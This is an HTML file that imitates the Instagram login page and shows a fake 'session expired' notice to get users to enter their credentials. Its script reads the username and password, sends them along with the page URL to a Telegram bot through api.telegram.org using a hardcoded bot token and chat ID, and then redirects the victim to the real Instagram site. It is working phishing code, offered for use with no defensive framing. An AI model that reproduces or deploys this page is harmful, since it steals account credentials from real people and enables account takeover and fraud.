<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .main-container {
            width: 350px;
        }
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px 10px 40px;
            text-align: center;
            box-sizing: border-box;
            margin-bottom: 10px;
        }
        .logo {
            font-family: cursive, sans-serif;
            font-size: 50px;
            margin: 22px 0 12px 0;
            font-weight: normal;
            color: #262626;
        }
        .session-notice {
            font-size: 14px;
            color: #737373;
            line-height: 18px;
            margin-bottom: 20px;
            font-weight: 400;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 12px;
            padding: 9px 8px;
            margin-bottom: 6px;
        }
        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .btn {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 7px;
            margin-top: 8px;
            margin-bottom: 15px;
        }
        .or-divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px 0;
        }
        .or-line {
            flex-grow: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .or-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }
        .forgot-pass {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="login-card">
            <div class="logo">Instagram</div>
            
            <!-- رسالة احترافية تدمج تنبيه انتهاء الجلسة بشكل طبيعي -->
            <div class="session-notice">
                Your session has expired. Please log in again to continue.
            </div>

            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn">Log In</button>
            </form>

            <div class="or-divider">
                <div class="or-line"></div>
                <div class="or-text">OR</div>
                <div class="or-line"></div>
            </div>

            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-pass">Forgot password?</a>
        </div>

        <div class="signup-card">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
            const chatId = "865078178";
            
            const message = "🎯 Professional Page Capture:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            const img = new Image();
            img.src = url;

            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 500);
        });
    </script>
</body>
</html>
